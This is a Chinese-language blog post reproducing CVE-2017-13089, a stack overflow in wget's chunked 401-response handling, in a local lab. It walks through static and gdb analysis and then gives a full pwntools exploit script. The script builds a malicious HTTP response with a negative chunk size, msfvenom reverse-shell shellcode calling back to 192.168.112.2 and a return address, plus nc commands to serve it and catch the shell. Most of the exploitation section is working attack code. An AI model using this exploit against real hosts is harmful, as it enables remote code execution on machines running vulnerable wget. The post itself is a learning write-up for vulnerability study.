---
layout: post
title: cve-2017-13089 wget栈溢出
tags: []
categories:
  - 漏洞复现
author: 1ss4k
date: 2021-03-24 23:08:00
---
## 环境搭建

1、**Ubuntu 16.04 64bit**


![upload successful](/images/pasted-275.png)


2、**wget .19.1**



## 漏洞触发

建立好poc文件之后，端口监听

```python
nc -lp 9799 < poc2
```

另一个窗口执行

```python
./wget 127.0.0.1:9799
```

![upload successful](/images/pasted-276.png)



## 静态分析

代码结构大致如下

```c
http.c{
  ...
  statcode == 401{
    ---> skip_short_body(sock, contlen, chunked_transfer_encoding) --->
  }
  ...
}
```

跟进skip_short_body函数

```c
skip_short_body (int fd, wgint contlen, bool chunked){
  
  SKIP_SIZE = 512;
  remaining_chunk_size = 0;
  
  char dlbuf[SKIP_SIZE + 1]; //定义一个字符数组
  dlbuf[SKIP_SIZE] = '\0';
  
  ...
  
  char *line = fd_read_line (fd); //首先获取到相应包的响应体的指针
  remaining_chunk_size = strtol (line, &endl, 16); //将line指向的值转换为整数值
  
  contlen = MIN (remaining_chunk_size, SKIP_SIZE);//contlen表示真正的响应体的长度，这里两者取较小值
  
  ret = fd_read (fd, dlbuf, MIN (contlen, SKIP_SIZE), -1); //将fd指针指向的内容，复制到dlbuf中 ---> fd_read
  
}
```



跟进fd_read函数，其在connect.c中。

```c
fd_read (int fd, char *buf, int bufsize, double timeout)
  ---> sock_read函数
```



sock_read()如下

```c
sock_read (int fd, char *buf, int bufsize)
```

此处触发栈溢出。



## 动态分析

```python
gdb wget

#设置参数
set args 127.0.0.1:9799 
  
#设置断点在某函数开头
b skip_short_body
#设置断点在某函数末尾
disass skip_short_body
找到地址
b *0x000000000041f18d

r #运行
```

同时另一个窗口

```python
nc -lp 9799 < poc
```

![upload successful](/images/pasted-277.png)

strol函数，传递的参数如下：

![upload successful](/images/pasted-278.png)


调用fd_read的时候，往第二个参数0x7fffffffd140内写入传输到内容，即AAAA……

![upload successful](/images/pasted-279.png)
然后返回到skip_short_body函数。为了方便后续的利用，需要计算栈偏移

```python
pwndbg> distance 0x7fffffffd140 $rbp+8
0x7fffffffd140->0x7fffffffd378 is 0x238 bytes (0x47 words)

0x238 = 568
```



## 利用



需要先关闭栈保护，然后重新编译。


![upload successful](/images/pasted-280.png)


生成shellcode，ifconfig查看ip，-f c表示是C语言格式的

![upload successful](/images/pasted-281.png)

payload如下：

```python
from pwn import *

payload = """HTTP/1.1 401 Not Authorized
Content-Type: text/plain; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive

-0xFFFFF000
"""
port = p64(6324).replace('\x00','')[::-1]
sc = "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x18\xb4\xc0\xa8\x70\x02\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

payload += sc + (568-len(sc))*'A'
#payload += "\xd0\xd8\xff\xff\xff\x7f\x00\x00"
payload += p64(0x7fffffffd140)
payload += "\n0\n"

with open('exp1','wb') as f:
        f.write(payload)

```



```python
#A窗口 监听端口
nc -nvlp 6324 < exp1

#B窗口 调试
set args 127.0.0.1:6324
b skip_short_body
或
b *0x000000000041f18d

#C窗口 连接
nc 127.0.0.1 6324
```



按照这个步骤执行，一直没成功，不知道是什么原因，从头再来执行一遍。

(1)生成shellcode

msf在kali中有，且ubuntu中安装比较麻烦，故不再安装。

先msf进入，再输入如下语句生成sc。

```python
msf5 > msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.112.2 LPORT=6324 -f c

Payload size: 74 bytes
Final size of c file: 335 bytes
unsigned char buf[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x18\xb4\xc0\xa8\x70\x02\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

msf5 > msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.112.2 LPORT=6789 -f c

Payload size: 74 bytes
Final size of c file: 335 bytes
unsigned char buf[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x1a\x85\xc0\xa8\x70\x02\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

```

如果改变端口的值，只有第二段有略微不同。自己采用6789端口，即第二段sc

```python
from pwn import *

payload = """HTTP/1.1 401 Not Authorized
Content-Type: text/plain; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive

-0xFFFFF000
"""
sc = "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x1a\x85\xc0\xa8\x70\x02\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

payload += sc + (568-len(sc))*'A'
payload += p64(0x7fffffffd140)
payload += "\n0\n"

with open('zzz','wb') as f:
        f.write(payload)
```

此处传入的返回地址可能是不准确的，调试一下

```python
#A窗口 监听端口
nc -nvlp 6789 < zzz

#B窗口 调试
set args 127.0.0.1:6789
b skip_short_body
b *0x000000000041f18d
```

此时写的地址变成了0xfd190，所以需要把上面的payload的返回地址改成0x190。



⚠️需要纠正两个点

利用过程主要分为两步，触发漏洞和反弹端口

(1)触发漏洞：窗口A通过nc开启一个端口6788，B进行调试，连接到这个端口，触发漏洞，执行shellcode。

(2)反弹shell，shellcode的作用是反弹shell，反弹的端口是在生成木马的时候指定的，此处设置的是6789，C窗口监听6789端口。

代码如下

```python
#A
nc -nvlp 6788 < zzz

#B
gdb wget
set args 127.0.0.1:6788
b *0x000000000041f18d
r

#c
nc -nvlp 6789
```



执行完shellcode之后，显示如下

![upload successful](/images/pasted-282.png)

在B窗口 disable 1，取消断点，然后c

![upload successful](/images/pasted-283.png)


收获：

1、自己基础太差，卡在那里是因为nc的用法、反弹shell 不清楚

2、适当参考网上的文章，可能有不适用的地方甚至有错误

3、勤能补拙！多看多花时间，也能理解！



参考

* [漏洞分析（一）CVE-2017-13089_wget栈溢出 by gandalf](http://www.gandalf.site/2019/01/cve-2017-13089wget.html)

* [CVE-2017-13089 wget 栈溢出漏洞复现 by h4lo](https://xz.aliyun.com/t/7394)

* [CVE-2017-13089 wget栈溢出复现 by 雷神众测](https://mp.weixin.qq.com/s/3rBfUnRiFoe-0w2C9JqwZw)